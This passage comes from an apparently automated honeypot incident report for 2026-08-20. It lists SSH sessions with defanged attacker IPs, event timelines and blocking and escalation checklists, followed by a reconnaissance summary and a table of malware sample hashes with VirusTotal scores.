- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ad55c7e99e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 10:22 |
| **Last Seen** | 2026-08-20 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:22:22` | `cowrie.session.connect` |
| `2026-08-20 10:22:22` | `cowrie.client.version` |
| `2026-08-20 10:22:22` | `cowrie.client.kex` |
| `2026-08-20 10:22:23` | `cowrie.login.success` |
| `2026-08-20 10:22:23` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:22:23` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24988405598a

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-08-20 10:24 |
| **Last Seen** | 2026-08-20 10:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:24:55` | `cowrie.session.connect` |
| `2026-08-20 10:24:56` | `cowrie.client.version` |
| `2026-08-20 10:24:56` | `cowrie.client.kex` |
| `2026-08-20 10:24:59` | `cowrie.login.success` |
| `2026-08-20 10:24:59` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1bf8c38657

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-20 10:25 |
| **Last Seen** | 2026-08-20 10:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:25:11` | `cowrie.session.connect` |
| `2026-08-20 10:25:12` | `cowrie.client.version` |
| `2026-08-20 10:25:12` | `cowrie.client.kex` |
| `2026-08-20 10:25:15` | `cowrie.login.success` |
| `2026-08-20 10:25:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ead450b268c6

| Field | Detail |
|---|---|
| **Source IP** | `221.120.57[.]125` |
| **First Seen** | 2026-08-20 10:26 |
| **Last Seen** | 2026-08-20 10:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:26:55` | `cowrie.session.connect` |
| `2026-08-20 10:26:56` | `cowrie.client.version` |
| `2026-08-20 10:26:56` | `cowrie.client.kex` |
| `2026-08-20 10:26:58` | `cowrie.login.success` |
| `2026-08-20 10:26:59` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.57[.]125` to AbuseIPDB if not already reported
- [ ] Block `221.120.57[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-043c86771e3f

| Field | Detail |
|---|---|
| **Source IP** | `66.228.53[.]4` |
| **First Seen** | 2026-08-20 10:27 |
| **Last Seen** | 2026-08-20 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:27:14` | `cowrie.session.connect` |
| `2026-08-20 10:27:14` | `cowrie.login.success` |
| `2026-08-20 10:27:15` | `cowrie.session.params` |
| `2026-08-20 10:27:15` | `cowrie.command.input` |
| `2026-08-20 10:27:15` | `cowrie.command.input` |
| `2026-08-20 10:27:15` | `cowrie.command.failed` |
| `2026-08-20 10:27:15` | `cowrie.command.input` |
| `2026-08-20 10:27:15` | `cowrie.command.failed` |
| `2026-08-20 10:27:15` | `cowrie.command.input` |
| `2026-08-20 10:27:15` | `cowrie.log.closed` |
| `2026-08-20 10:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.228.53[.]4` to AbuseIPDB if not already reported
- [ ] Block `66.228.53[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1655aeb8ea3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:28 |
| **Last Seen** | 2026-08-20 10:28 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:28:02` | `cowrie.session.connect` |
| `2026-08-20 10:28:03` | `cowrie.client.version` |
| `2026-08-20 10:28:03` | `cowrie.client.kex` |
| `2026-08-20 10:28:05` | `cowrie.login.success` |
| `2026-08-20 10:28:07` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:28:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 10:28:20` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-684365c2dd1f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:32 |
| **Last Seen** | 2026-08-20 10:37 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:32:40` | `cowrie.session.connect` |
| `2026-08-20 10:32:41` | `cowrie.client.version` |
| `2026-08-20 10:32:41` | `cowrie.client.kex` |
| `2026-08-20 10:32:43` | `cowrie.login.success` |
| `2026-08-20 10:32:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fd6ce29b061

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:38 |
| **Last Seen** | 2026-08-20 10:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:38:54` | `cowrie.session.connect` |
| `2026-08-20 10:38:54` | `cowrie.client.version` |
| `2026-08-20 10:38:55` | `cowrie.client.kex` |
| `2026-08-20 10:38:56` | `cowrie.login.success` |
| `2026-08-20 10:38:56` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:38:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 10:38:56` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2de385c6aa5

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-08-20 10:42 |
| **Last Seen** | 2026-08-20 10:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:42:41` | `cowrie.session.connect` |
| `2026-08-20 10:42:42` | `cowrie.client.version` |
| `2026-08-20 10:42:42` | `cowrie.client.kex` |
| `2026-08-20 10:42:44` | `cowrie.login.success` |
| `2026-08-20 10:42:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e63d0d40e745

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-08-20 10:42 |
| **Last Seen** | 2026-08-20 10:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:42:51` | `cowrie.session.connect` |
| `2026-08-20 10:42:52` | `cowrie.client.version` |
| `2026-08-20 10:42:52` | `cowrie.client.kex` |
| `2026-08-20 10:42:53` | `cowrie.login.success` |
| `2026-08-20 10:42:54` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc7a8f939ddd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:43 |
| **Last Seen** | 2026-08-20 10:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:43:48` | `cowrie.session.connect` |
| `2026-08-20 10:43:48` | `cowrie.client.version` |
| `2026-08-20 10:43:48` | `cowrie.client.kex` |
| `2026-08-20 10:43:50` | `cowrie.login.success` |
| `2026-08-20 10:43:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:43:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 10:43:51` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c025e0c48c0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-20 10:45 |
| **Last Seen** | 2026-08-20 10:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:45:10` | `cowrie.session.connect` |
| `2026-08-20 10:45:10` | `cowrie.client.version` |
| `2026-08-20 10:45:10` | `cowrie.client.kex` |
| `2026-08-20 10:45:11` | `cowrie.login.success` |
| `2026-08-20 10:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e130b8f2f66

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-20 10:45 |
| **Last Seen** | 2026-08-20 10:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:45:10` | `cowrie.session.connect` |
| `2026-08-20 10:45:10` | `cowrie.client.version` |
| `2026-08-20 10:45:10` | `cowrie.client.kex` |
| `2026-08-20 10:45:11` | `cowrie.login.success` |
| `2026-08-20 10:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06a7866dd95

| Field | Detail |
|---|---|
| **Source IP** | `216.218.206[.]66` |
| **First Seen** | 2026-08-20 10:47 |
| **Last Seen** | 2026-08-20 10:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0[.]0 Safari/537.36 OPR/120.0.0[.]0, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:47:32` | `cowrie.session.connect` |
| `2026-08-20 10:47:32` | `cowrie.login.success` |
| `2026-08-20 10:47:33` | `cowrie.session.params` |
| `2026-08-20 10:47:33` | `cowrie.command.input` |
| `2026-08-20 10:47:33` | `cowrie.command.input` |
| `2026-08-20 10:47:33` | `cowrie.command.failed` |
| `2026-08-20 10:47:33` | `cowrie.command.input` |
| `2026-08-20 10:47:33` | `cowrie.command.failed` |
| `2026-08-20 10:47:33` | `cowrie.command.input` |
| `2026-08-20 10:47:33` | `cowrie.log.closed` |
| `2026-08-20 10:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.218.206[.]66` to AbuseIPDB if not already reported
- [ ] Block `216.218.206[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-062144680ab8

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-08-20 10:49 |
| **Last Seen** | 2026-08-20 10:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:49:03` | `cowrie.session.connect` |
| `2026-08-20 10:49:04` | `cowrie.client.version` |
| `2026-08-20 10:49:04` | `cowrie.client.kex` |
| `2026-08-20 10:49:05` | `cowrie.login.success` |
| `2026-08-20 10:49:06` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef9522c13019

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:49 |
| **Last Seen** | 2026-08-20 10:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:49:55` | `cowrie.session.connect` |
| `2026-08-20 10:49:55` | `cowrie.client.version` |
| `2026-08-20 10:49:55` | `cowrie.client.kex` |
| `2026-08-20 10:49:56` | `cowrie.login.success` |
| `2026-08-20 10:49:58` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:49:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 10:49:58` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ee65dd20ae

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-08-20 10:54 |
| **Last Seen** | 2026-08-20 10:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:54:15` | `cowrie.session.connect` |
| `2026-08-20 10:54:15` | `cowrie.client.version` |
| `2026-08-20 10:54:15` | `cowrie.client.kex` |
| `2026-08-20 10:54:17` | `cowrie.login.success` |
| `2026-08-20 10:54:18` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b8b4f1d2cf7

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-20 10:54 |
| **Last Seen** | 2026-08-20 10:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:54:23` | `cowrie.session.connect` |
| `2026-08-20 10:54:23` | `cowrie.client.version` |
| `2026-08-20 10:54:23` | `cowrie.client.kex` |
| `2026-08-20 10:54:25` | `cowrie.login.success` |
| `2026-08-20 10:54:25` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-145a445be339

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:54 |
| **Last Seen** | 2026-08-20 10:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:54:50` | `cowrie.session.connect` |
| `2026-08-20 10:54:50` | `cowrie.client.version` |
| `2026-08-20 10:54:51` | `cowrie.client.kex` |
| `2026-08-20 10:54:54` | `cowrie.login.success` |
| `2026-08-20 10:54:56` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:54:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 10:54:57` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **58** | 2026-08-20 08:55 | 2026-08-20 10:53 | 74m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-08-20 09:14 | 2026-08-20 10:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `190.244.176[.]108` | **3** | 2026-08-20 09:21 | 2026-08-20 09:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]53` | **3** | 2026-08-20 10:52 | 2026-08-20 10:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]180` | **3** | 2026-08-20 09:49 | 2026-08-20 09:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]168` | **3** | 2026-08-20 09:48 | 2026-08-20 09:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]111` | **3** | 2026-08-20 09:50 | 2026-08-20 09:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]86` | **2** | 2026-08-20 09:05 | 2026-08-20 09:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `38.159.180[.]47` | **2** | 2026-08-20 10:20 | 2026-08-20 10:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | **2** | 2026-08-20 09:36 | 2026-08-20 09:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]73` | 1 | 2026-08-20 10:15 | 2026-08-20 10:15 | 5s | 0 | `T1592` | 🟢 LOW |
| `117.248.201[.]39` | 1 | 2026-08-20 09:48 | 2026-08-20 09:48 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.88.120[.]62` | 1 | 2026-08-20 09:15 | 2026-08-20 09:15 | 5s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]133` | 1 | 2026-08-20 09:03 | 2026-08-20 09:03 | 1s | 0 | `T1592` | 🟢 LOW |
| `213.65.190[.]48` | 1 | 2026-08-20 10:27 | 2026-08-20 10:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.60.240[.]161` | 1 | 2026-08-20 08:56 | 2026-08-20 08:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-20 10:02 | 2026-08-20 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]37` | 1 | 2026-08-20 09:20 | 2026-08-20 09:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.223.176[.]171` | 1 | 2026-08-20 10:49 | 2026-08-20 10:49 | 6s | 0 | `T1592` | 🟢 LOW |
| `66.164.37[.]170` | 1 | 2026-08-20 10:04 | 2026-08-20 10:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]4` | 1 | 2026-08-20 10:27 | 2026-08-20 10:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]3` | 1 | 2026-08-20 10:08 | 2026-08-20 10:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-08-20 09:20 | 2026-08-20 09:20 | 1s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-08-20 09:09 | 2026-08-20 09:11 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
